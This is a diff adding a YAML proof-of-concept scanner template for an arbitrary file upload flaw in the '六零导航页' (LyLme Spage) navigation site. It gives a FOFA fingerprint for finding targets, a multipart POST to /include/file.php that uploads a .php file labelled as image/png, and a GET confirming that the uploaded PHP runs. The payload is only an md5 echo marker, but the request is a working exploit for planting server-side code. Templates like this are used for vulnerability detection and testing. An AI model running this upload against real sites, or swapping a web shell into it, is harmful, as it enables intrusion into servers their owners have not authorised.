@@ -1,0 +1,33 @@
+id: poc-yaml-lylme-spage-file-php-anyfile-upload
+info:
+  name: 六零导航页 file.php 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 六零导航页
+  fofa: icon_hash="-282504889"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /include/file.php
+  headers:
+    Content-Type: multipart/form-data; boundary=---------------------------207262699182048909098055515
+  data: '-----------------------------207262699182048909098055515
+
+    Content-Disposition: form-data; name="file"; filename="{{.t1}}.php"
+
+    Content-Type: image/png
+
+
+    <?php echo md5({{.t1}});?>
+
+    -----------------------------207262699182048909098055515--'
+  expression: status_code == 200 && contains(body,"php")
+  output:
+  - regex_match(body,`url":"/(?P<path>.*?).php`)
+- method: GET
+  path: /{{.path}}.php
+  expression: status_code == 200 && body == t2
+transport: http
